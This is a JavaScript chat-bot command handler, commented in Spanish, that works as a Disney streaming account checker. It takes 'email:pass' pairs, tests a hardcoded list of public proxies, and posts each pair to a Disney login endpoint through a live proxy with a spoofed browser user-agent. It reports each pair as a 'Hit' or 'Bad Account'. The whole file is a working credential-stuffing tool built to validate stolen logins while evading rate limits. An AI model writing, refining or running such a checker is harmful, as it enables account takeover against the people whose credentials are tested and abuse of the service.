import axios from 'axios';

// Lista de proxies para usarlas durante la verificación
const proxies = [
  '180.178.37.114:80',
  '47.90.167.27:8081',
  '71.14.218.2:8080',
  '47.91.110.148:80'
];

// Función para verificar si el proxy está vivo
async function verificarProxy(ipPuerto, url = 'http://www.google.com') {
  const proxy = `http://${ipPuerto}`;
  const proxies = {
    http: proxy,
    https: proxy,
  };

  try {
    // Intentar hacer una solicitud a la URL utilizando el proxy
    const response = await axios.get(url, { proxy: { host: ipPuerto.split(':')[0], port: parseInt(ipPuerto.split(':')[1]) }, timeout: 5000 });

    // Verificar si la respuesta es exitosa (código 200)
    if (response.status === 200) {
      return true; // Proxy vivo
    } else {
      return false; // Proxy no vivo
    }
  } catch (error) {
    return false; // Proxy muerto o no se puede conectar
  }
}

// Función para verificar credenciales usando proxies
async function verificarCredenciales(email, password) {
  for (const proxy of proxies) {
    // Verificar si el proxy está vivo
    const estaVivo = await verificarProxy(proxy);
    if (estaVivo) {
      console.log(`Usando el proxy ${proxy} para verificar credenciales.`);
      try {
        // Realizar la solicitud de verificación al servidor Disney
        const response = await axios.post('https://global.edge.bamgrid.com/idp/login', {
          email: email,
          password: password,
        }, {
          headers: {
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36',
          },
          proxy: {
            host: proxy.split(':')[0],
            port: parseInt(proxy.split(':')[1]),
          },
        });

        // Verificar si la respuesta es un hit
        if (response.data.includes('id_token')) {
          return `Hit para ${email}:${password} usando el proxy ${proxy}`;
        } else {
          return `Bad Account para ${email}:${password} usando el proxy ${proxy}`;
        }
      } catch (err) {
        console.error(`Error con el proxy ${proxy}: ${err.message}`);
      }
    }
  }

  return `Todos los proxies están muertos. No se pudo verificar las credenciales para ${email}:${password}.`;
}

// Handler para el comando .disney
let handler = async (m, { conn, command, text, args, usedPrefix }) => {
  if (!text) return conn.reply(m.chat, 'Por favor, ingresa las credenciales en formato "email:pass".', m);

  const [email, password] = text.split(':');
  if (!email || !password) return conn.reply(m.chat, 'Formato incorrecto. Usa el formato "email:pass".', m);

  try {
    const resultado = await verificarCredenciales(email, password);
    conn.reply(m.chat, resultado, m);
  } catch (error) {
    console.error('Error en la verificación:', error);
    conn.reply(m.chat, 'Ocurrió un error al verificar las credenciales. Intenta nuevamente.', m);
  }
};

handler.command = ['disney']; // Comando que activará este handler

export default handler;
